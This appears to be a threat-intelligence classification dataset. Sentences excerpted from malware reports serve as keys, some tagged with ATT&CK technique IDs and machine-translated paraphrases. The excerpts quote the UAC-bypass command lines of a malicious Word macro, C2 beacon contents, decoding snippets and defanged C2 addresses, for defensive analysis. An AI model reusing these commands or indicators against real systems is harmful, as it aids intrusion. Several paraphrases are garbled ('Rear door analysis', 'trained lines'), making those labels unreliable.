    "POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode(\"psX0DKYB0u...5TximyY+QY=\"), \"u2RLhh+!LGd9p8!ZtuKcN\")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.: MacBookPro9,2)  Most actions are self-explanatory": [],
    "Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness": [],
    "This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)": [],
    "This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware": [],
    "A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components": [],
    "The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim": [],
    "Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection": [],
    "A multilayered approach is a must to securing the organization’s perimeter, especially for information security professionals and system/IT administrators": [],
    "This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label “C:\\” and the computer name": [],
    "Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers": [],
    "Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums": [],
    "Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources": [],
    "URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v": [],
    "The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions": [],
    "Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities": [],
    "itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an “agent_id”, which is a unique identifier for each compromised host": [],
    "The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the “Hardware UUID” listed in the system information application, as seen in the Figure 3 screenshot of our analysis system": [],
    "The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”": [],
    "The payload sends system information about the infected computer to the C&C server and downloads additional tools.": [],
    "If it is successful then it will send out basic host information and await further commands.": [],
    "After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.": [
        {
            "tec_id": "T1082",
            "en_text": "After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.",
            "data_text": "After decoding the IP addresses of the C2 server, from the trained lines, the two Trojans will attempt to gather information about the node and send it to the C2 server."
        }
    ],
    "Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address": [],
    "Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.": [
        {
            "tec_id": "T1082",
            "en_text": "Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.",
            "data_text": "After a successful installation in the system, Trickbot collects system information such as OS, CPU and memory information, user accounts, lists of installed programs."
        }
    ],
    "(To bypass UAC) configurable setting for the process to abuse  Other than these, new coding algorithm has been introduced": [],
    "This request is followed by a call to “GetisrunasAbById” to determine if the Trojan should use “runas” to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click": [],
    "The CAB file contains the following files and functions:  dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass)": [],
    "The macro then extracts the CAB file into %systemroo%\\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts Once the files have been extracted, the Visual Basic macro deletes the CAB file and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections) Command lines used by the Visual Basic macro:  cmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe cmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows": [],
    "The key differences in this variant:  Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file There is one CAB file for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass  exe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)   exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS": [],
    "Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself": [],
    "The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph": [],
    "Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code": [],
    "These four were then all modified on the same date and time on October 13, 2018 08:21": [],
    "A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time": [],
    "Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication": [],
    "This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017": [],
    "The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC)": [],
    "The time of the observed attacker activity coincides with Iran’s Daylight Time, which is +0430 UTC": [],
    "Cadelle and Chafer are most active during the day time within Iran’s time zone and primarily operate during Iran’s business week (Saturday through Thursday)": [],
    "When the backdoor establishes a connection to the command and control server, it sets the request period time equal to the specified dwell time for the standby mode": [],
    "If the dwell time value for the active mode has been set, but the package has not been received, the dwell time value is incremented by the dwell time value for the active period": [],
    "This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode": [],
    "Timezone Check The Trojan check to see if the system is configured (“DaylightName”) with one of the following time zones:   Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5)   Human Interaction Check Before executing its functional code, the Trojan presents a dialog box with the following line of code:   Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null);   This dialog box displays  An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code": [],
    "The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set": [],
    "Figure 3 Countries in which OopsIE will run in based on the time zone Notable Differences The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog": [],
    "In another case the attackers use another code snippet borrowed from the SubTee GitHub project, this time filling in a fully templated .NET application whitelist bypass file: SHA256: 3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time the attacker didn’t have to write any of their own code, instead they were simply able to paste their shellcode directly into a template, in order to launch PlugX as a child process of a trusted application": [],
    "Watches uninstall time, checks time diff (local time vs internet time)": [],
    "Here’s a python code to decode": [],
    "The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT": [],
    "Figure 2: Exploit Shellcode used to Locate and Decode Payload The shellcode (Figure 2) searches for and decodes the executable payload contained in memory between the beginning and ending file markers 0xBABABABA and 0xBBBBBBBB, respectively": [],
    "This function is able to obfuscate code so that every iteration of the code is presented differently": [],
    "It then downloads and decrypts a PNG file": [],
    "The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the configuration file": [],
    "The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left": [
        {
            "tec_id": "T1140",
            "en_text": "The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left",
            "data_text": "Code comparison shows HighShell code including salt variable containing di2zag7wZHTK9YR0NGq that is not present in the TwoFace code on the left"
        }
    ],
    "Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512": [],
    "Figure 11 Embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502": [],
    "Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):  Figure 12 Decrypted strings from embedded BMP file After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on": [],
    "In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse): /+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA   The resulting data is then parsed and decrypted using RC4": [],
    "Here is the code:The goal of this code is to get information from the properties of the document (\"Subject\", \"Company\", \"Category\", \"Hyperlink base\" and finally \"Comments\")": [],
    "The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck": [],
    "This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence": [],
    "The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime": [],
    "Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code": [],
    "Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory": [],
    "If after the package has been decoded its size is bigger than 3 bytes, the Trojan decrypts its first 11 bytes with XOR using the method similar to the one described above": [],
    "The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory": [],
    "The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\\setup.cab   Encoded CAB file in the Word document": [],
    "Configuration Decryption:  Another small, but same important function in the photo above, is the function for decrypting the data containing the C&C configuration": [],
    "The MirageFox binaries export a function called dll_wWinMain, the name of an export in vsodscpl.dll, a module by McAfee that is loaded by a few of their executables that import and call this function": [],
    "The most interesting part is the decrypted C&C configuration, as can be seen in the image below": [],
    "Figure 2 – The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker": [],
    "It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks": [],
    "Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle": [
        {
            "tec_id": "T1140",
            "en_text": "Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle",
            "data_text": "Rear door analysis The main rear door cycle has two main functions, infoClient and runHandle"
        }
    ],
    "Packet::getData decrypts the received payload and Converter::outString descrambles the result": [],
    "In the event this is successful the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  It proceeds to load and decrypt and embedded bitmap resource file": [],
    "In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine": [],
    "The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine": [],
    "ESET’s analysis of a recent backdoor used by TeleBots – the group behind the massive NotPetya ransomware outbreak – uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously proven The post New TeleBots backdoor: First evidence linking Industroyer to NotPetya appeared first on WeLiveSecurity": [],
    "The following code snippet was used to decode strings within OopsIE:out = \"\" for e in obfuscated_string.split(\"-\"):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section": [],
    "This exception invokes the exception handler containing the HTTP communication code, allowing it to run": [],
    "Figure 1 – The main code from the .NET wrapper, with the Shellcode array being created and executed in a new thread": [],
    "The first shellcode decrypts a further shellcode block": [],
    "After decrypting the strings, they must be further decompressed using LZNT1": [],
    "It then reads and decrypts the content between these values to yield an IP address as shown below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: \"rsa-key\"AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     A Python script to decode strings encrypted with this technique is given in Appendix B – Python Scripts": [],
    "To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers": [],
    "Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document": [],
    "The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute": [],
    "The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string": [],
    "We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one": [],
    "The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data": [],
    "The unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “E9BC3BD76216AFA560BFB5ACAF5731A3”": [],
    "“Knock” also appears in several strings inside the code of SpeakUp": [],
    "Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool   com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration": [],
    "It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime": [
        {
            "tec_id": "T1140",
            "en_text": "It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime",
            "data_text": "It supports both code and data in raw, encrypted data blocks that must be decrypted and used at runtime, and hidden functions that are not exposed before runtime."
        }
    ],
    "No pdb/debug strings are present in the code": [],
    "In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents": [],
    "In this particular instance, the payload is encoded via base64, which certutil decodes": [],
    "The following function written in Python may be used to decode this file:def decode(data): \tout = \"\" \tc = 0 \tfor d in data: \t\tout += chr(ord(d)^c) \t\tc+=1 \treturn outOnce decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117": [],
    "The following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called:  int num = 5; int num2 = 155; bool flag = num > num2; if (flag) {     <legitimate Sales System Application code>     }            else {     NewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(), null, \"Invoke\", new object[]     {         null,         new object[0]     }, null, null, null, true);The payload uses this technique to run a chain of methods that eventually carry out its malicious task": [],
    "(Source: Dell SecureWorks) Both the redirect code on the compromised site and the exploit code appear and disappear, indicating that the adversaries add the code when they want to leverage the SWC and remove the code when it is not in use to limit the visibility of their operations": [],
    "The decrypted contents of the log file adhere to the format in Figure 22": [],
    "Decrypted OwaAuth log file format": [],
    "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers": [],
    "Malicious document used by Tropic Trooper PDB Strings as Context Clues The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB)": [],
    "The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10": [
        {
            "tec_id": "T1140",
            "en_text": "The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10",
            "data_text": "The figure and table below shows the encrypted TClient configuration that we decrypted (by Python code): Figure 10"
        }
    ],
    "Snapshot of code we used to decrypt TClient’s configuration   Figure 11": [],
    "Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information": [],
    "Create Service": [],
    "Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques": [],
    "In addition, web traffic between a service provider’s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily": [],
    "This effectively routes SOGU malware traffic through the victim’s service provider, which likely indicates a foothold on the service provider’s network": [],
    "These parameters install it as a service": [],
    "The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks": [],
    "The malicious DLL is not a service DLL because it lacks ServiceMain()": [],
    "The victims Data from Cadelle’s C&C servers shows that a large number of Backdoor.Cadelspy infections affected individual users of Iranian internet service providers (ISPs) and hosting services": [],
    "\"Are you Happy?\" campaign.\"FreeMilk\" campaign.\"North Korean Human Rights\" campaign.\"Evil New Year 2018\" campaign.On January 2nd of 2018, the \"Evil New Year 2018\" was started": [],
    "The document brought Talos a new gift - a new version of ROKRAT": [],
    "Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target": [],
    "BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running": [],
    "HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules": [
        {
            "tec_id": "T1105",
            "en_text": "HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules",
            "data_text": "HAYMAKER is a back door that can download and perform additional payloads as modules"
        }
    ],
    "It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file": [],
    "The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.   The file’s path": [],
    "The directory creation.  Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files": [],
    "A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.   The script verifies all parts of the malware have been downloaded.  After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.   One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.   The twelve downloaded files": [],
    "The config file provides download instructions for the loader": [],
    "Displayed below are these new, xml formatted plugin names “weap_hwi”, “ps”, and “vsnet” in a BlackEnergy configuration file download from a c2 server": [],
    "One of the discovered config files contained a URL with an as yet unidentified md5: hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php Victim set #4 A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy": [],
    "HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”": [],
    "Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems": [],
    "The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server": [],
    "Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers": [],
    "The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself": [],
    "It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files": [],
    "Using this information, they can decide to explore further or instruct the compromised computer to download additional malware": [],
    "In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account": [],
    "Upon execution, the initialized file downloads multiple malicious payloads from remote servers": [
        {
            "tec_id": "T1105",
            "en_text": "Upon execution, the initialized file downloads multiple malicious payloads from remote servers",
            "data_text": "When executed, the initialized file downloads multiple malicious downloads from remote servers"
        }
    ],
    "Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session": [],
    "If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded": [],
    "attachedTemplate.dotm xxx 11/15/18 05:35 11/15/18 05:35 109.248.148[.]42    Table 2 Remote templates downloaded by Dear Joohn delivery documents As seen in Table 1, the delivery documents accessed their respective remote templates from four C2 servers at the following IP addresses:  185.203.118[.]198 145.249.105[.]165 188.241.58[.]170  109.248.148[.]42  These initial C2 IP addresses not only hosted the remote templates that subsequently load the first-stage Zebrocy or Cannon payloads, but the IP addresses also hosted the C2 server for the first-stage payloads themselves": [],
    "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries": [],
    "If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards": [],
    "The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file – Picture2.exe": [],
    "The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc": [],
    "The link provided in the malicious email led to a fake VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the “VPN Client” (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)": [],
    "This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the \"Golden Time\" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group": [],
    "The macro contains malicious code that attempts to download content from a remote server": [],
    "!DWN  Downloads a file from a specified URL": [],
    "Responds to the IRC server via PRIVMSG with “Download  Success :FilePath=<path to downloaded file>” or “Download Fail” if unsuccessful": [],
    "The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system": [],
    "It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)": [],
    "Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable": [],
    "Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal": [
        {
            "tec_id": "T1105",
            "en_text": "Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal",
            "data_text": "Zyklon is an open, full-featured backdoor capable of keylogging, collecting passwords, loading and executing additional plug-ins, conducting distributed denial of service (DDoS) attacks, and self-updating and self-deleting."
        }
    ],
    "The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)": [],
    "Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)": [],
    "Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1": [],
    "Figure 8 shows the network communication of the Pause.ps1 download": [],
    "Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)": [],
    "I download my tools from GitHub, and so do my victims": [],
    "The “upload” command downloads files from the CnC and saves them locally in “C:\\ProgramData“": [],
    "Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers": [],
    "It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now": [],
    "This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc": [],
    "As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server": [],
    "Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system": [],
    "The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet": [
        {
            "tec_id": "T1105",
            "en_text": "The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet",
            "data_text": "The .iqy files use Excel readiness to download and include the contents of the remote server in the table."
        }
    ],
    "2 Downloads a file to the system": [],
    "Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes": [],
    "This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word": [],
    "13 Copy file to adbFle.tmp, and upload it to the C2": [
        {
            "tec_id": "T1105",
            "en_text": "13 Copy file to adbFle.tmp, and upload it to the C2",
            "data_text": "13 Copy the file to adbFle.tmp and upload it to C2"
        }
    ],
    "When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)": [],
    "Both responses instruct the malware to download and load a remote plugin": [],
    "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample": [
        {
            "tec_id": "T1105",
            "en_text": "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample",
            "data_text": "During the analysis of PLAINTEE files in WildFire, we observed the download and execution of the plug-in to this sample."
        }
    ],
    "Most of them manipulate the machine to download and execute different files": [],
    "Use of PowerShell to download additional tools": [],
    "The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT": [],
    "NavRAT is able to download and execute files located in the attachment of a received email": [],
    "The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable": [],
    "Figure 2 SYSCON network traffic witnessed during execution   Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family": [],
    "CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine": [],
    "Delivery document The delivery document contains a macro that downloads an executable from a remote server": [],
    "Command_Down_exec: This command downloads and executes new modules.  It takes a url as the argument and uses that to download and execute files": [],
    "Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes": [],
    "After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used": [],
    "The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries": [],
    "The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection": [],
    "A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.": [],
    "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.": [],
    "certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm": [],
    "The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables": [],
